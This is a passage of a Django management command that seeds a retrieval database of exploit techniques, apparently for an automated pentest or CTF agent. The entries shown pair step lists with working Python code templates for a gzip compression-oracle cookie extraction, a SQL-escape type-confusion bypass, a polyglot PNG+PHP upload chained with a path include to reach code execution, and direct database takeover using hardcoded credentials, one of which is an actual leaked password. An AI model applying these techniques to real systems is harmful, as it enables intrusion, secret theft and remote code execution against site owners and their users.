                "1. Identify endpoint where secret is included in response (e.g. cookies reflected at /search)\n"
                "2. Insert guess string into same response — e.g. pass 'cookies.*' + '<p id=key>token{s' in query\n"
                "3. Compare Content-Length after gzip compression:\n"
                "   - Correct prefix: '<p id=key>token{s' overlaps with actual '<p id=key>token{s3cr3t...' → smaller CL\n"
                "   - Wrong prefix: '<p id=key>token{x' has no overlap → larger CL\n"
                "4. Δ(Content-Length) is typically 1-3 bytes difference, identifiable\n"
                "5. Expand compression context with padding (\\x01 * N) to improve oracle accuracy\n"
                "6. Iterate through alphabet extracting one character at a time, appending to extracted prefix"
            ),
            "code_template": (
                "import requests\n\n"
                "pad = '\\x01' * 1000\n"
                "extracted = ''\n"
                "charset = 'abcdefghijklmnopqrstuvwxyz0123456789_{}!@'\n\n"
                "for pos in range(32):\n"
                "    best_char, best_cl = None, float('inf')\n"
                "    for c in charset:\n"
                "        prefix = extracted + c\n"
                "        query = {{\n"
                "            'cookies': '*',\n"
                "            f'cookies.{{pad}}<p id=key>{{prefix}}': '*',\n"
                "        }}\n"
                "        resp = requests.post('{frontend_url}/search',\n"
                "            json={{'query': query}},\n"
                "            cookies={{'key': secret_cookie}})\n"
                "        cl = int(resp.headers['Content-Length'])\n"
                "        if cl < best_cl:\n"
                "            best_cl = cl; best_char = c\n"
                "    extracted += best_char"
            ),
            "examples": [{
                "params": {
                    "compression": "flask-compress gzip (COMPRESS_MIN_SIZE=500)",
                    "secret_location": "req.cookies.key reflected via /search",
                    "oracle": "Content-Length header via debug mode + MessageChannel",
                    "padding": "\\x01 * 1000",
                    "delta": "2 bytes per correct character",
                },
                "notes": (
                    "Flask-compress default minimum size is 500 bytes — response must be large enough for gzip. "
                    "Query user data together to exceed threshold. "
                    "Use debug mode (window.debug.param='Content-Length') to receive "
                    "fetch response header via MessageChannel to construct the oracle."
                ),
            }],
            "tags": ["breach", "compression-oracle", "gzip", "side-channel", "content-length", "cookie-extraction"],
        },
    },

    # ── 26. Broken sanitize function → SQL escape bypass for non-string types ──
    {
        "name": "python_sql_escape_type_bypass",
        "vuln_type": "sqli",
        "attack_metadata": {
            "name": "Python sql_escape type-confusion bypass — non-string values skip sanitization",
            "applies_when": (
                "A Python/Flask API uses a custom sql_escape function that only sanitizes string values "
                "(isinstance(val, str)) before interpolating into SQL via str.format() or % formatting. "
                "If the sanitize helper itself has a calling-convention bug (e.g., missing argument) that "
                "crashes on string inputs, ALL string-bearing requests fail with 500, while non-string JSON "
                "values (int, bool, dict, list of ints) pass through unescaped. Attackers can submit "
                "non-string typed JSON values that get format()-interpolated into raw SQL."
            ),
            "prerequisites": [
                "Custom sql_escape iterates JSON body keys and only escapes isinstance(val, str)",
                "sanitize() function has a calling bug (e.g., sanitize(val) instead of sanitize(conn, val)) causing TypeError on strings",
                "SQL queries use str.format() or % formatting with the unsanitized values",
                "express.json() / Flask request.get_json() parses full JSON types (int, bool, dict, null)",
            ],
            "technique_steps_md": (
                "1. Identify sql_escape: check if it only covers isinstance(val, str) — dicts/ints/bools pass through\n"
                "2. Confirm sanitize bug: send a request with string values → 500 Internal Server Error\n"
                "3. Send non-string values (integers, bools) that pass sql_escape without error\n"
                "4. The value is interpolated into SQL via format() — integer pid works for normal queries\n"
                "5. For UPDATE statements like `checksum = checksum + {}`, non-string values produce valid SQL\n"
                "6. Combine with direct DB access if available to achieve full exploitation"
            ),
            "code_template": (
                "import requests\n"
                "# String values crash sql_escape\n"
                "r = requests.post(f'{url}/endpoint', json={'field': 'string_value'})  # → 500\n"
                "# Non-string values bypass sql_escape\n"
                "r = requests.post(f'{url}/endpoint', json={'field': 123})  # → 200, value interpolated raw\n"
                "# SQL: SELECT * FROM table WHERE field = '123'"
            ),
            "examples": [{
                "params": {
                    "sql_escape_bug": "sanitize(val) instead of sanitize(conn, val) → TypeError on strings",
                    "bypass_type": "integer/bool/dict values skip isinstance(val, str) branch",
                    "affected_endpoints": "All POST endpoints using json_body() → sql_escape()",
                },
                "notes": (
                    "The broken sanitize effectively disables ALL string-based SQL escaping. "
                    "Normal app functionality (join, login) is broken. Exploitation relies on "
                    "non-string JSON types or direct DB access."
                ),
            }],
            "tags": ["sqli", "type-confusion", "sanitize-bypass", "python", "flask", "json-type"],
        },
    },

    # ── 27. Polyglot PNG + PHP LFI via include with DB-controlled path ──
    {
        "name": "polyglot_png_php_include_rce",
        "vuln_type": "lfi_rce",
        "attack_metadata": {
            "name": "Polyglot PNG with appended PHP code + LFI via include with DB-controlled path",
            "applies_when": (
                "A PHP app has an `include $path;` statement where $path comes from a database column, "
                "and the attacker can modify that column (via SQL injection or direct DB access). "
                "A file upload endpoint validates images via exif_imagetype() / getimagesize() but "
                "does not strip data after the PNG IEND marker. By appending `<?php ... ?>` after "
                "the IEND chunk, the file passes image validation while containing executable PHP. "
                "Setting the DB path to point to the uploaded image triggers PHP execution on include."
            ),
            "prerequisites": [
                "PHP `include $path;` where $path is read from a DB column",
                "Attacker can modify the DB column (SQLi, direct DB access, or admin feature)",
                "File upload validates image type (exif_imagetype, getimagesize) but does not re-encode",
                "short_open_tag = Off (PHP 8.x default) to avoid `<?` in PNG binary triggering parse errors",
                "No open_basedir restriction blocking the uploaded image path",
            ],
            "technique_steps_md": (
                "1. Create minimal valid PNG (e.g., 1x1 pixel): PNG signature + IHDR + IDAT + IEND\n"
                "2. Append PHP payload after IEND: `<?php echo file_get_contents('/flag_path'); ?>`\n"
                "3. Upload the polyglot PNG via the image upload endpoint\n"
                "4. Capture the server-assigned filename (e.g., sha256(random).png)\n"
                "5. Modify the DB to set the include path to the uploaded image:\n"
                "   UPDATE product SET product_cache = '../image/{hash}.png' WHERE pid = N;\n"
                "6. Trigger the include via the product card endpoint:\n"
                "   GET /product_card.php?pid=N&cache=../image/{hash}.png\n"
                "7. PHP outputs PNG binary (garbage) then executes appended PHP → flag in response"
            ),
            "code_template": (
                "import struct, zlib, io, requests, mysql.connector\n\n"
                "# 1. Build polyglot PNG+PHP\n"
                "def make_png_php(php_code):\n"
                "    sig = b'\\x89PNG\\r\\n\\x1a\\n'\n"
                "    def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xFFFFFFFF)\n"
                "    ihdr = struct.pack('>IIBBBBB',1,1,8,2,0,0,0)\n"
                "    raw = b'\\x00\\xff\\x00\\x00'\n"
                "    return sig + chunk(b'IHDR',ihdr) + chunk(b'IDAT',zlib.compress(raw)) + chunk(b'IEND',b'') + php_code.encode()\n\n"
                "png = make_png_php('<?php echo file_get_contents(\"{flag_path}\"); ?>')\n"
                "# 2. Upload\n"
                "resp = requests.post('{url}/upload', files={{'image': ('e.png', io.BytesIO(png), 'image/png')}})\n"
                "# 3. Parse filename, 4. Update DB, 5. Trigger include"
            ),
            "examples": [{
                "params": {
                    "upload_endpoint": "POST /ymp_internal/upload_action.php",
                    "include_endpoint": "GET /ymp_internal/product_card.php?pid=N&cache=PATH",
                    "db_column": "product.product_cache",
                    "image_validation": "exif_imagetype() + getimagesize() + extension allowlist (jpg/png)",
                    "flag_path": "/flag_*.txt",
                },
                "notes": (
                    "PNG IEND marks the end of image data — anything after it is ignored by image parsers "
                    "but is processed by PHP's include. The DB path uses relative traversal (../image/) "
                    "to reach the uploaded file from the include's working directory."
                ),
            }],
            "tags": ["polyglot", "png", "php", "lfi", "include", "rce", "file-upload", "image-validation-bypass"],
        },
    },

    # ── 28. Hardcoded DB credentials + exposed port → direct DB manipulation ──
    {
        "name": "exposed_db_credentials_direct_manipulation",
        "vuln_type": "access_control_bypass",
        "attack_metadata": {
            "name": "Hardcoded DB credentials with exposed port → direct database manipulation",
            "applies_when": (
                "Application source code contains hardcoded database credentials (in config files, "
                "ORM configs, or PHP/Python source), AND the database port is exposed externally "
                "(via docker-compose port mapping or firewall misconfiguration). Attackers connect "
                "directly to the DB, bypassing all application-level access controls, input validation, "
                "and broken sanitization. Enables: reading secrets, modifying user roles, inserting "
                "arbitrary records, and setting up further exploitation (e.g., LFI path injection)."
            ),
            "prerequisites": [
                "DB credentials visible in source code (dbutil.py, config.php, .env, docker-compose.yml, etc.)",
                "Database port reachable from attacker's network (docker-compose ports: mapping, no firewall)",
                "DB user has sufficient privileges (INSERT, UPDATE, SELECT at minimum)",
            ],
            "technique_steps_md": (
                "1. Identify DB credentials in source: connection strings, config files, docker-compose.yml\n"
                "2. Confirm DB port is accessible: connect from attacker machine to host:port\n"
                "3. Enumerate the schema: SHOW TABLES, DESCRIBE table_name\n"
                "4. Read application secrets: SELECT * FROM config (secret_key, API keys, etc.)\n"
                "5. Escalate privileges: UPDATE user SET is_admin=1 WHERE username='attacker'\n"
                "6. Inject exploit data: UPDATE product SET product_cache='../image/malicious.png'\n"
                "7. Forge auth tokens using extracted secrets if needed"
            ),
            "code_template": (
                "import mysql.connector\n"
                "conn = mysql.connector.connect(host='{host}', port={db_port},\n"
                "    user='{db_user}', password='{db_pass}', database='{db_name}')\n"
                "cur = conn.cursor()\n"
                "# Read secrets\n"
                "cur.execute('SELECT * FROM config')\n"
                "# Modify data for further exploitation\n"
                "cur.execute(\"UPDATE product SET product_cache=%s WHERE pid=%s\", (payload_path, pid))\n"
                "conn.commit()"
            ),
            "examples": [{
                "params": {
                    "db_type": "MySQL",
                    "credentials_location": "dbutil.py (Python) + upload_action.php (PHP)",
                    "exposed_port": "23434 → MySQL 3306",
                    "privileges": "ALL PRIVILEGES on ymp.*",
                },
                "notes": (
                    "docker-compose.yml maps MySQL port 23434:3306 externally. "
                    "Credentials ymp/H4ppyH4ppyM0n3y found in both Python dbutil.py and PHP sources. "
                    "Combined with polyglot PNG upload + LFI include for full RCE chain."
                ),
            }],
            "tags": ["credentials", "exposed-db", "mysql", "direct-access", "privilege-escalation", "docker"],
        },
    },
]


class Command(BaseCommand):
    help = "Seed exploit techniques (transferable tricks, kind='exploit_technique')"

    def add_arguments(self, parser):
        parser.add_argument(
            "--reset", action="store_true",
            help="Delete all existing source='technique' entries and re-seed",
        )

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            deleted = PayloadPattern.objects.filter(source="technique").delete()
            self.stdout.write(self.style.WARNING(f"reset: deleted {deleted}"))

        created_cnt = 0
        updated_cnt = 0
        for t in TECHNIQUES:
            obj, created = PayloadPattern.objects.update_or_create(
                name=t["name"],
                source="technique",
                defaults={
                    "vuln_type": t["vuln_type"],
                    "category": t.get("category", "exploitation"),
                    "safety_level": t.get("safety_level", "safe"),
                    "request_template": "",  # techniques are not single payloads
                    "matcher": None,
                    "safety_notes": t["attack_metadata"].get("applies_when", "")[:500],
                    "tags": t.get("tags", []),
                    "attack_metadata": t["attack_metadata"],
                    "is_active": True,
                },
            )
            self.stdout.write(
                f"  technique {'+' if created else '='} {t['name']:40s} ({t['vuln_type']})"
            )
            if created:
                created_cnt += 1
            else:
                updated_cnt += 1

        self.stdout.write(self.style.SUCCESS(
            f"\ntechniques: +{created_cnt} created, ={updated_cnt} updated"
        ))

        # Embedding — enables search_knowledge / retrieve_similar_patterns hits
        if embeddings_available():
            from api.embedding_service import pattern_text
            targets = list(PayloadPattern.objects.filter(source="technique"))
            texts = []
            for p in targets:
                # technique attack_metadata body is richer — embed primarily from that
                meta = p.attack_metadata or {}
                parts = [
                    f"name: {meta.get('name', p.name)}",
                    f"vuln_type: {p.vuln_type}",
                    f"applies_when: {meta.get('applies_when', '')}",
                    f"prerequisites: {' / '.join(meta.get('prerequisites') or [])}",
                    f"steps: {meta.get('technique_steps_md', '')[:500]}",
                    f"tags: {', '.join(meta.get('tags') or p.tags or [])}",
                ]
                texts.append("\n".join(parts))
            self.stdout.write(f"embedding {len(texts)} techniques via {EMBEDDING_MODEL} ...")
            vectors = embed_documents(texts)
            if vectors:
                for p, vec in zip(targets, vectors):
                    p.embedding = vec
                    p.embedding_model = EMBEDDING_MODEL
                    p.save(update_fields=["embedding", "embedding_model"])
                self.stdout.write(self.style.SUCCESS(
                    f"embeddings saved for {len(vectors)} techniques"
                ))
            else:
                self.stdout.write(self.style.WARNING("Embedding generation failed — skipping"))
        else:
            self.stdout.write(self.style.WARNING(
                "Voyage embedding disabled: VOYAGE_API_KEY not set — semantic search returns empty results"
            ))
